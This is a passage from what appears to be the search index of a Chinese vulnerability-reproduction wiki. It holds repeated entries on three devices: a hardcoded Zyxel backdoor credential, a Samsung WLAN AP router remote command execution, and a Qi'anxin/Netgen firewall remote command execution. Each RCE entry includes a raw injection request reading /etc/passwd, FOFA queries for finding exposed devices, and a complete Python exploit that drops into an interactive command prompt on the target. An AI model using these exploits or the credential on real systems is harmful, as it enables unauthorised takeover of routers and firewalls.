\u8fdb\u884c\u653b\u51fb\uff0c\u767b\u5f55\u4e3a\u540e\u95e8\u7ba1\u7406\u5458\u8d26\u6237 zyfwp:PrOw!aN_fXp \u8fd9\u91cc\u4f7f\u7528Goby\u8bbe\u7f6e\u5b57\u5178\u626b\u63cf\u5373\u53ef","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/Zyxel/Zyxel%20%E7%A1%AC%E7%BC%96%E7%A0%81%E5%90%8E%E9%97%A8%E8%B4%A6%E6%88%B7%E6%BC%8F%E6%B4%9E%20CVE-2020-29583/#\u53c2\u8003\u6587\u7ae0","text":"scan_CVE-2020-29583 Zyxel USG Series \u8d26\u6237\u786c\u7f16\u7801\u6f0f\u6d1e\uff08CVE-2020-29583\uff09","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E4%B8%89%E6%98%9F/%E4%B8%89%E6%98%9F%20WLAN%20AP%20WEA453e%E8%B7%AF%E7%94%B1%E5%99%A8%20%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"\u4e09\u661f WLAN AP WEA453e\u8def\u7531\u5668 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u4e09\u661f WLAN AP WEA453e\u8def\u7531\u5668 \u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u53ef\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u4efb\u610f\u547d\u4ee4\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u4e09\u661f WLAN AP WEA453e\u8def\u7531\u5668 FOFA \u00b6 [!NOTE] title==\"Samsung WLAN AP\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u5982\u4e0b \u8bf7\u6c42\u5305\u5982\u4e0b POST /(download)/tmp/a.txt HTTP/1.1 Host: 175.199.182.152 Connection: close Content-Length: 48 command1=shell:cat /etc/passwd| dd of=/tmp/a.txt \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u4e09\u661f WLAN AP WEA453e\u8def\u7531\u5668 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/(download)/tmp/a.txt\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = \"command1=shell:cat /etc/passwd| dd of=/tmp/a.txt\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if \"root\" in response . text and response . status_code == 200 : print ( \" \\033 [36m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e, \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( target_url , response . text )) while True : cmd = str ( input ( \" \\033 [35mCmd >>> \\033 [0m\" )) POC_2 ( target_url , cmd ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u9ed8\u8ba4\u7ba1\u7406\u5458\u5f31\u53e3\u4ee4 \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , cmd ): vuln_url = target_url + \"/(download)/tmp/a.txt\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = \"command1=shell: {} | dd of=/tmp/a.txt\" . format ( cmd ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [36m {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Samsung_WLAN_AP_wea453e_router_RCE","title":"\u4e09\u661f WLAN AP WEA453e\u8def\u7531\u5668  \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E4%B8%89%E6%98%9F/%E4%B8%89%E6%98%9F%20WLAN%20AP%20WEA453e%E8%B7%AF%E7%94%B1%E5%99%A8%20%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u4e09\u661f-wlan-ap-wea453e\u8def\u7531\u5668--\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","text":"","title":"\u4e09\u661f WLAN AP WEA453e\u8def\u7531\u5668  \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E4%B8%89%E6%98%9F/%E4%B8%89%E6%98%9F%20WLAN%20AP%20WEA453e%E8%B7%AF%E7%94%B1%E5%99%A8%20%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u4e09\u661f WLAN AP WEA453e\u8def\u7531\u5668 \u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u53ef\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u4efb\u610f\u547d\u4ee4\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E4%B8%89%E6%98%9F/%E4%B8%89%E6%98%9F%20WLAN%20AP%20WEA453e%E8%B7%AF%E7%94%B1%E5%99%A8%20%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u4e09\u661f WLAN AP WEA453e\u8def\u7531\u5668","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E4%B8%89%E6%98%9F/%E4%B8%89%E6%98%9F%20WLAN%20AP%20WEA453e%E8%B7%AF%E7%94%B1%E5%99%A8%20%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] title==\"Samsung WLAN AP\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E4%B8%89%E6%98%9F/%E4%B8%89%E6%98%9F%20WLAN%20AP%20WEA453e%E8%B7%AF%E7%94%B1%E5%99%A8%20%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u5982\u4e0b \u8bf7\u6c42\u5305\u5982\u4e0b POST /(download)/tmp/a.txt HTTP/1.1 Host: 175.199.182.152 Connection: close Content-Length: 48 command1=shell:cat /etc/passwd| dd of=/tmp/a.txt","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E4%B8%89%E6%98%9F/%E4%B8%89%E6%98%9F%20WLAN%20AP%20WEA453e%E8%B7%AF%E7%94%B1%E5%99%A8%20%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u4e09\u661f WLAN AP WEA453e\u8def\u7531\u5668 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/(download)/tmp/a.txt\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = \"command1=shell:cat /etc/passwd| dd of=/tmp/a.txt\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if \"root\" in response . text and response . status_code == 200 : print ( \" \\033 [36m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e, \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( target_url , response . text )) while True : cmd = str ( input ( \" \\033 [35mCmd >>> \\033 [0m\" )) POC_2 ( target_url , cmd ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u9ed8\u8ba4\u7ba1\u7406\u5458\u5f31\u53e3\u4ee4 \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , cmd ): vuln_url = target_url + \"/(download)/tmp/a.txt\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = \"command1=shell: {} | dd of=/tmp/a.txt\" . format ( cmd ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [36m {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E4%B8%89%E6%98%9F/%E4%B8%89%E6%98%9F%20WLAN%20AP%20WEA453e%E8%B7%AF%E7%94%B1%E5%99%A8%20%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Samsung_WLAN_AP_wea453e_router_RCE","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E5%A5%87%E5%AE%89%E4%BF%A1/%E5%A5%87%E5%AE%89%E4%BF%A1%20%E7%BD%91%E5%BA%B7%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20RCE/","text":"\u5947\u5b89\u4fe1 \u7f51\u5eb7\u4e0b\u4e00\u4ee3\u9632\u706b\u5899 RCE \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u5947\u5b89\u4fe1 \u7f51\u5eb7\u4e0b\u4e00\u4ee3\u9632\u706b\u5899\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff0c\u901a\u8fc7\u6f0f\u6d1e\u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u5947\u5b89\u4fe1 \u7f51\u5eb7\u4e0b\u4e00\u4ee3\u9632\u706b\u5899 FOFA \u00b6 [!NOTE] app=\"\u7f51\u5eb7\u79d1\u6280-\u4e0b\u4e00\u4ee3\u9632\u706b\u5899\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u767b\u5f55\u9875\u9762\u5982\u4e0b \u53d1\u9001\u5982\u4e0b\u8bf7\u6c42\u5305 POST /directdata/direct/router HTTP/1.1 Host: XXX.XXX.XXX.XXX Connection: close Content-Length: 179 Cache-Control: max-age=0 sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Content-Type: application/json Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 {\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;cat /etc/passwd >/var/www/html/test_cmd.txt\"]}],\"type\":\"rpc\",\"tid\":17,\"f8839p7rqtj\":\"=\"} \u518d\u8bf7\u6c42\u83b7\u53d6\u547d\u4ee4\u6267\u884c\u7ed3\u679c http://xxx.xxx.xxx.xxxx/test_cmd.txt \u6f0f\u6d1ePOC \u00b6 import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u5947\u5b89\u4fe1 \u7f51\u5eb7\u4e0b\u4e00\u4ee3\u9632\u706b\u5899 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/directdata/direct/router\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36\" , \"Content-Type\" : \"application/json\" , } data = '{\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;cat /etc/passwd >/var/www/html/test_cmd.txt\"]}],\"type\":\"rpc\",\"tid\":17,\"f8839p7rqtj\":\"=\"}' try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if response . status_code == 200 and \"success\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e, \u6b63\u5728\u6267\u884c\u547d\u4ee4 cat /etc/passwd \\033 [0m\" . format ( target_url )) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = target_url + \"/test_cmd.txt\" , headers = headers , data = data , verify = False , timeout = 5 ) if \"root\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a\uff1a {} \\033 [0m\" . format ( response . text )) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , cmd ) else : print ( \" \\033 [31m[x] \u76ee\u6807\u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , cmd ): vuln_url = target_url + \"/directdata/direct/router\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36\" , \"Content-Type\" : \"application/json\" , } data = '{\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt; %s >/var/www/html/test_cmd.txt\"]}],\"type\":\"rpc\",\"tid\":17,\"f8839p7rqtj\":\"=\"}' % ( cmd ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = target_url + \"/test_cmd.txt\" , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a\uff1a \\n {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u5947\u5b89\u4fe1 \u7f51\u5eb7\u4e0b\u4e00\u4ee3\u9632\u706b\u5899 RCE"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E5%A5%87%E5%AE%89%E4%BF%A1/%E5%A5%87%E5%AE%89%E4%BF%A1%20%E7%BD%91%E5%BA%B7%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20RCE/#\u5947\u5b89\u4fe1-\u7f51\u5eb7\u4e0b\u4e00\u4ee3\u9632\u706b\u5899-rce","text":"","title":"\u5947\u5b89\u4fe1 \u7f51\u5eb7\u4e0b\u4e00\u4ee3\u9632\u706b\u5899 RCE"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E5%A5%87%E5%AE%89%E4%BF%A1/%E5%A5%87%E5%AE%89%E4%BF%A1%20%E7%BD%91%E5%BA%B7%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20RCE/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u5947\u5b89\u4fe1 \u7f51\u5eb7\u4e0b\u4e00\u4ee3\u9632\u706b\u5899\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\uff0c\u901a\u8fc7\u6f0f\u6d1e\u653b\u51fb\u8005\u53ef\u4ee5\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E5%A5%87%E5%AE%89%E4%BF%A1/%E5%A5%87%E5%AE%89%E4%BF%A1%20%E7%BD%91%E5%BA%B7%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20RCE/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u5947\u5b89\u4fe1 \u7f51\u5eb7\u4e0b\u4e00\u4ee3\u9632\u706b\u5899","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E5%A5%87%E5%AE%89%E4%BF%A1/%E5%A5%87%E5%AE%89%E4%BF%A1%20%E7%BD%91%E5%BA%B7%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20RCE/#fofa","text":"[!NOTE] app=\"\u7f51\u5eb7\u79d1\u6280-\u4e0b\u4e00\u4ee3\u9632\u706b\u5899\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E5%A5%87%E5%AE%89%E4%BF%A1/%E5%A5%87%E5%AE%89%E4%BF%A1%20%E7%BD%91%E5%BA%B7%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20RCE/#\u6f0f\u6d1e\u590d\u73b0","text":"\u767b\u5f55\u9875\u9762\u5982\u4e0b \u53d1\u9001\u5982\u4e0b\u8bf7\u6c42\u5305 POST /directdata/direct/router HTTP/1.1 Host: XXX.XXX.XXX.XXX Connection: close Content-Length: 179 Cache-Control: max-age=0 sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Content-Type: application/json Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 {\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;cat /etc/passwd >/var/www/html/test_cmd.txt\"]}],\"type\":\"rpc\",\"tid\":17,\"f8839p7rqtj\":\"=\"} \u518d\u8bf7\u6c42\u83b7\u53d6\u547d\u4ee4\u6267\u884c\u7ed3\u679c http://xxx.xxx.xxx.xxxx/test_cmd.txt","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E5%A5%87%E5%AE%89%E4%BF%A1/%E5%A5%87%E5%AE%89%E4%BF%A1%20%E7%BD%91%E5%BA%B7%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99%20RCE/#\u6f0f\u6d1epoc","text":"import requests import sys import random from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u5947\u5b89\u4fe1 \u7f51\u5eb7\u4e0b\u4e00\u4ee3\u9632\u706b\u5899 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/directdata/direct/router\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36\" , \"Content-Type\" : \"application/json\" , } data = '{\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;cat /etc/passwd >/var/www/html/test_cmd.txt\"]}],\"type\":\"rpc\",\"tid\":17,\"f8839p7rqtj\":\"=\"}' try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) if response . status_code == 200 and \"success\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e, \u6b63\u5728\u6267\u884c\u547d\u4ee4 cat /etc/passwd \\033 [0m\" . format ( target_url )) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = target_url + \"/test_cmd.txt\" , headers = headers , data = data , verify = False , timeout = 5 ) if \"root\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a\uff1a {} \\033 [0m\" . format ( response . text )) while True : cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : sys . exit ( 0 ) else : POC_2 ( target_url , cmd ) else : print ( \" \\033 [31m[x] \u76ee\u6807\u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_2 ( target_url , cmd ): vuln_url = target_url + \"/directdata/direct/router\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36\" , \"Content-Type\" : \"application/json\" , } data = '{\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt; %s >/var/www/html/test_cmd.txt\"]}],\"type\":\"rpc\",\"tid\":17,\"f8839p7rqtj\":\"=\"}' % ( cmd ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , headers = headers , data = data , verify = False , timeout = 5 ) requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = target_url + \"/test_cmd.txt\" , headers = headers , data = data , verify = False , timeout = 5 ) print ( \" \\033 [32m[o] \u54cd\u5e94\u4e3a\uff1a \\n {} \\033 [0m\" . format ( response . text )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1ePOC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87%E6%BC%8F%E6%B4%9E/%E6%9C%97%E8%A7%86/%E6%9C%97%E8%A7%86%20TG400%20GSM%20%E7%BD%91%E5%85%B3%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%20%20CVE-2021-27328/","text":"\u6717\u89c6 TG400 GSM \u7f51\u5173\u76ee\u5f55\u904d\u5386 CVE-2021-27328 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u6717\u89c6 TG400 GSM 